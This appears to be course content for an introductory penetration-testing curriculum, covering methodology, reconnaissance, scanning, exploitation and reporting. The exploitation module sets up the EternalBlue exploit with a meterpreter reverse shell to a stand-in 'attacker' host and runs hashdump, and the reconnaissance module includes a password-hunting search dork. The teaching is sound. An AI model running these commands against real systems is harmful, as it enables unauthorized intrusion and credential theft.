modules.title: Introduction to Penetration Testing
modules.content:
## Penetration Testing Overview

Penetration testing simulates real-world attacks to identify vulnerabilities.

### Types of Pentests

- **Black Box** - No prior knowledge
- **White Box** - Full access to source code
- **Gray Box** - Partial information

### Methodology

1. **Planning** - Define scope, rules of engagement
2. **Reconnaissance** - Gather information
3. **Scanning** - Identify vulnerabilities
4. **Exploitation** - Attempt to exploit
5. **Post-Exploitation** - Maintain access
6. **Reporting** - Document findings

### Legal Considerations

- Always get written authorization
- Stay within scope
- Document everything
- Report all findings

modules.title: Reconnaissance & OSINT
modules.content:
## Information Gathering

### Passive Reconnaissance

```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
nslookup -type=any target.com

# Subdomain discovery
sublist3r -d target.com
```

### OSINT Tools

- **theHarvester** - Email, names, subdomains
- **Shodan** - Internet-connected devices
- **Google Dorks** - Advanced search operators

```
site:target.com filetype:pdf
intitle:"index of" password
```

### Active Reconnaissance

```bash
# Port scanning
nmap -sV -sC target.com

# Web technology detection
whatweb target.com
```

modules.title: Vulnerability Scanning
modules.content:
## Scanning for Vulnerabilities

### Network Scanning with Nmap

```bash
# Service version detection
nmap -sV -p- target

# Vulnerability scripts
nmap --script vuln target

# OS detection
nmap -O target
```

### Web Application Scanning

```bash
# Nikto web scanner
nikto -h http://target

# Directory bruteforce
gobuster dir -u http://target -w wordlist.txt
```

### Vulnerability Scanners

- **Nessus** - Comprehensive scanner
- **OpenVAS** - Open-source alternative
- **Qualys** - Cloud-based scanning

modules.title: Exploitation Techniques
modules.content:
## Exploitation Basics

### Metasploit Framework

```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker
exploit
```

### Common Exploits

- Buffer overflows
- SQL injection
- Command injection
- File inclusion

### Post-Exploitation

```bash
# Meterpreter commands
getuid
sysinfo
hashdump
```

modules.title: Reporting & Documentation
modules.content:
## Professional Reporting

### Report Structure

1. **Executive Summary** - High-level overview
2. **Methodology** - Testing approach
3. **Findings** - Vulnerabilities discovered
4. **Risk Ratings** - CVSS scores
5. **Recommendations** - Remediation steps
6. **Appendices** - Technical details

### Risk Ratings

| Rating | CVSS Score | Description |
|--------|------------|-------------|
| Critical | 9.0-10.0 | Immediate action |
| High | 7.0-8.9 | Priority fix |
| Medium | 4.0-6.9 | Plan to fix |
| Low | 0.1-3.9 | Accept or fix |

### Best Practices

- Clear, concise language
- Reproducible steps
- Evidence (screenshots)
- Business impact
